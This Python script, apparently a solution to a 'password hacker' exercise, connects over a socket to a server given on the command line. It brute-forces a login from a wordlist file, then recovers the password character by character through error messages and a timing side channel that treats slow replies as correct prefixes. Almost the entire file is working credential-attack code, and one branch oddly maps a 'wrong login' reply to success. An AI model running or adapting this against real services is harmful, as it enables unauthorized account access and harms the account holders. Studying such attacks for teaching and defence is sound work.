import sys
import socket
import itertools
import string
import json
import enum
import datetime


class HackingResult(enum.Enum):
    wrong_login = 0
    wrong_password = 1
    got_exception = 2
    connection_success = 3
    undefined_result = 4

    @staticmethod
    def get_result(message):
        if 'password' in message:
            return HackingResult.wrong_password
        elif 'exception' in message:
            return HackingResult.got_exception
        elif 'success' in message:
            return HackingResult.connection_success
        elif 'wrong login' in message:
            return HackingResult.connection_success
        else:
            return HackingResult.undefined_result


class Client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.socket = None

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.ip, self.port))

    def check_password(self, message):
        start = datetime.datetime.now()
        self.socket.send(message)
        data = self.socket.recv(1024)
        end = datetime.datetime.now()
        delta = end - start
        if delta.microseconds >= 100000:
            return HackingResult.got_exception
        else:
            output = data.decode('utf8').lower()
            return HackingResult.get_result(output)

    def check_login(self, message):
        self.socket.send(message)
        data = self.socket.recv(1024)
        output = data.decode('utf8').lower()
        return HackingResult.get_result(output)

    def find_login(self):
        with open('logins.txt') as passwords_file:
            login_founded = False
            datas_dict = {'login': '', 'password': ''}
            login = ''
            while not login_founded:
                for base_login in passwords_file.read().splitlines():
                    datas_dict['login'] = base_login
                    datas_obj = json.dumps(datas_dict)
                    res = self.check_login(datas_obj.encode('utf8'))
                    login_founded = res == HackingResult.wrong_password or res == HackingResult.got_exception
                    if login_founded:
                        login = base_login
                        break
                if login_founded:
                    break
            return login

    def find_password(self, login):
        password = ''
        password_founded = False
        variables = list(itertools.chain(string.ascii_letters, string.digits))
        datas_dict = {'login': login, 'password': ''}
        while not password_founded:
            for var in variables:
                current_password = password + var
                datas_dict["password"] = current_password
                datas_obj = json.dumps(datas_dict)
                res = self.check_password(datas_obj.encode('utf8'))
                if res == HackingResult.got_exception:
                    password = current_password
                    break
                elif res == HackingResult.connection_success:
                    password = current_password
                    password_founded = True
                    break
            if password_founded:
                break
        datas_dict["password"] = password
        return json.dumps(datas_dict)

    def start_hacking(self):
        found_login = self.find_login()
        result_dict = self.find_password(found_login)
        print(result_dict)
        self.socket.close()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        exit(-1)
    ip_for_connecting = sys.argv[1]
    port_for_connecting = int(sys.argv[2])
    client = Client(ip_for_connecting, port_for_connecting)
    client.connect()
    client.start_hacking()
